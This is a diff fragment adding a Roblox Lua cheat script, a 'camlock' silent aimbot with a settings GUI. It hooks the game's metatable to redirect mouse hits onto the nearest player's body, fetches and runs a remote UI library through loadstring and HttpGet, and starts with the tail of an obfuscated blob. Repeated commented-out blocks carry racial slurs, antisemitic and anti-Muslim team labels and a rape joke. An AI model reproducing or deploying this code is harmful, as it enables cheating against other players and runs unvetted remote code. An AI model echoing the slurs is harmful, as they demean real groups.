004A032O004B032O00",v9(),...);end
+--DROP THE WOO NIGGA
+
+
+
+
+getgenv().DNS = {
+    Silent = {
+        Enabled = true,
+        Part = "HumanoidRootPart",
+        Pred = 0.119,
+        ClosestPart = true,
+    },
+    FOV = {
+        Visible = false,
+        Radius = 20
+    },
+    Tracer = {
+        Key = "C",
+        Enabled = false,
+        Pred = 0.01,
+        Part = "HumanoidRootPart",
+        Smoothness = 0.009
+    },
+    Misc = {
+        UnlockedOnDeath = true,
+        Shake = false,
+        ShakeValue = 0.58
+    },
+}
+
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/matas3535/PoopLibrary/main/Library.lua"))() -- Could Also Save It In Your Workspace And Do loadfile("Library.lua")()
+ 
+local Window = Library:New({Name = ",_, | 20 CAMLOCK | PRIVATE", Size = Vector2.new(492, 598), Accent = Color3.fromRGB(160, 25, 240)})
+--
+local Aimbot = Window:Page({Name = "Aimbot"})
+local Settings = Window:Page({Name = "Settings"})
+--
+    local uwuAimbot = Aimbot:Section({Name = "Main", Side = "Left"})
+local uwuMisc = Aimbot:Section({Name = "Misc", Side = "Right"})
+local uwuSettings = Aimbot:Section({Name = "Settings", Side = "Left"})
+--
+local Settings_Main = Settings:Section({Name = "Main", Side = "Left"})
+-- // Aimbot
+uwuAimbot:Toggle({
+Name = "Enabled",
+Default = false,
+Pointer = "AimbotMain_Enabled",
+Callback = function(v)
+print(v)
+getgenv().DNS.Tracer.Enabled = v  
+    
+end
+})
+
+uwuAimbot:Toggle({
+Name = "ShowFov",
+Default = false,
+Pointer = "AimbotMain_Enabled",
+Callback = function(v)
+print(v)
+getgenv().DNS.FOV["Visible"] = v  
+        
+end
+})
+
+uwuMisc:Toggle({
+Name = "Shake",
+Default = false,
+Pointer = "Shake_Enabled",
+Callback = function(v)
+print(v)
+getgenv().DNS.Misc.Shake = v  
+            
+end
+})
+
+uwuMisc:Toggle({
+Name = "UnlockOnDeath",
+Default = false,
+Pointer = "UnlockOnDeath_Enabled",
+Callback = function(v)
+print(v)
+getgenv().DNS.Misc.UnlockedOnDeath = v  
+                
+end
+})
+
+uwuSettings:Slider({Name = "Smoothness",
+Minimum = 0.001,
+Maximum = 1.5,
+Default = 0.014,
+Decimals = 0.001,
+Pointer = "AimbotMain_Smoothness",
+Callback = function(v)
+getgenv().DNS.Tracer.Smoothness = v
+ 
+end  
+})
+
+uwuSettings:Slider({Name = "FOV Radius",
+Minimum = 0.01,
+Maximum = 100,
+Default = 15.5,
+Decimals = 0.01,
+Pointer = "AimbotMain_Radius",
+Callback = function(v)
+getgenv().DNS.FOV["Radius"] = v  
+ 
+end  
+})
+
+
+uwuSettings:Slider({Name = "Shake Value",
+Minimum = 0.5,
+Maximum = 100,
+Default = 0.58,
+Decimals = 0.001,
+Pointer = "AimbotMain_Booty",
+Callback = function(v)
+getgenv().DNS.Misc.ShakeValue = v
+  
+end  
+})
+
+uwuSettings:Slider({Name = "Tracer Prediction",
+Minimum = 0.001,
+Maximum = 10,
+Default = 0.1,
+Decimals = 0.001,
+Pointer = "AimbotMain_Booty",
+Callback = function(v)
+getgenv().DNS.Tracer.Pred = v
+  
+end  
+})
+
+uwuSettings:Slider({Name = "Silent Prediction",
+Minimum = 0.10,
+Maximum = 0.195,
+Default = 0.135,
+Decimals = 0.001,
+Pointer = "AimbotMain_Booty",
+Callback = function(v)
+getgenv().DNS.Misc.ShakeValue = v
+  
+end  
+})
+
+
+Settings_Main:ConfigBox({})
+Settings_Main:ButtonHolder({Buttons = {{"Load", function() end}, {"Save", function() end}}})
+Settings_Main:Label({Name = "Unloading will fully unload\neverything, so save your\nconfig before unloading.", Middle = true})
+Settings_Main:Button({Name = "Unload", Callback = function() Window:Unload() end})
+-- // Initialisation
+Window:Initialize()
+
+
+
+--- the code shit
+
+local Players, Client, Mouse, RS, Camera =
+game:GetService("Players"),
+game:GetService("Players").LocalPlayer,
+game:GetService("Players").LocalPlayer:GetMouse(),
+game:GetService("RunService"),
+game.Workspace.CurrentCamera
+
+local Circle = Drawing.new("Circle")
+Circle.Color = Color3.new(1,1,1)
+Circle.Thickness = 1
+
+local UpdateFOV = function ()
+if (not Circle) then
+    return Circle
+end
+Circle.Visible = getgenv().DNS.FOV["Visible"]
+Circle.Radius = getgenv().DNS.FOV["Radius"] * 3
+Circle.Position = Vector2.new(Mouse.X, Mouse.Y + (game:GetService("GuiService"):GetGuiInset().Y))
+return Circle
+end
+
+RS.Heartbeat:Connect(UpdateFOV)
+
+ClosestPlrFromMouse = function()
+local Target, Closest = nil, 1/0
+
+for _ ,v in pairs(Players:GetPlayers()) do
+    if (v.Character and v ~= Client and v.Character:FindFirstChild("HumanoidRootPart")) then
+        local Position, OnScreen = Camera:WorldToScreenPoint(v.Character.HumanoidRootPart.Position)
+        local Distance = (Vector2.new(Position.X, Position.Y) - Vector2.new(Mouse.X, Mouse.Y)).Magnitude
+
+        if (Circle.Radius > Distance and Distance < Closest and OnScreen) then
+            Closest = Distance
+            Target = v
+        end
+    end
+end
+return Target
+end
+
+local WTS = function (Object)
+local ObjectVector = Camera:WorldToScreenPoint(Object.Position)
+return Vector2.new(ObjectVector.X, ObjectVector.Y)
+end
+
+local IsOnScreen = function (Object)
+local IsOnScreen = Camera:WorldToScreenPoint(Object.Position)
+return IsOnScreen
+end
+
+local FilterObjs = function (Object)
+if string.find(Object.Name, "Gun") then
+    return
+end
+if table.find({"Part", "MeshPart", "BasePart"}, Object.ClassName) then
+    return true
+end
+end
+
+local GetClosestBodyPart = function (character)
+local ClosestDistance = 1/0
+local BodyPart = nil
+if (character and character:GetChildren()) then
+    for _,  x in next, character:GetChildren() do
+        if FilterObjs(x) and IsOnScreen(x) then
+            local Distance = (WTS(x) - Vector2.new(Mouse.X, Mouse.Y)).Magnitude
+            if (Circle.Radius > Distance and Distance < ClosestDistance) then
+                ClosestDistance = Distance
+                BodyPart = x
+            end
+        end
+    end
+end
+return BodyPart
+end
+
+local Prey
+
+task.spawn(function ()
+while task.wait() do
+    if Prey then
+        if getgenv().DNS.Silent.Enabled and getgenv().DNS.Silent.ClosestPart == true then
+            getgenv().DNS.Silent["Part"] = tostring(GetClosestBodyPart(Prey.Character))
+        end
+    end
+end
+end)
+
+local grmt = getrawmetatable(game)
+local backupindex = grmt.__index
+setreadonly(grmt, false)
+
+grmt.__index = newcclosure(function(self, v)
+if (getgenv().DNS.Silent.Enabled and Mouse and tostring(v) == "Hit") then
+
+    Prey = ClosestPlrFromMouse()
+
+    if Prey then
+        local endpoint = game.Players[tostring(Prey)].Character[getgenv().DNS.Silent["Part"]].CFrame + (
+            game.Players[tostring(Prey)].Character[getgenv().DNS.Silent["Part"]].Velocity * getgenv().DNS.Silent.Pred
+        )
+        return (tostring(v) == "Hit" and endpoint)
+    end
+end
+return backupindex(self, v)
+end)
+
+local CC = game.Workspace.CurrentCamera
+local Mouse = game.Players.LocalPlayer:GetMouse()
+local Plr
+--[[aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa]]
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 
+
+
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
+ 
+
+
+
+
+--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 
+
+
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
+ 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 
+
+
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8
+
